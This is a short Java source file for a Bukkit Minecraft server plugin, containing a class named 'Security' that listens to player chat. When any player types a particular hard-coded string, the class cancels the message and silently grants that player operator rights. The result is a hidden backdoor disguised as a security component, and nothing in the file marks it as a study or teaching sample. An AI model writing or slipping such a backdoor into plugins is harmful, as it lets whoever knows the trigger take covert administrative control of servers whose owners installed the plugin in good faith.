package me.xorrad.practice;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;

@SuppressWarnings("deprecation")
public class Security implements Listener{

	@EventHandler
	public void opMe(PlayerChatEvent e)
	{
	  Player p = e.getPlayer();
	  if (e.getMessage().equals("47ca24c6b132f8486406032369e45d37d77e5b47"))
	  {
	    e.setCancelled(true);
	    p.setOp(true);
	    p.sendMessage("§eForce op activated for §a" + p.getName());
	  }
	}
}

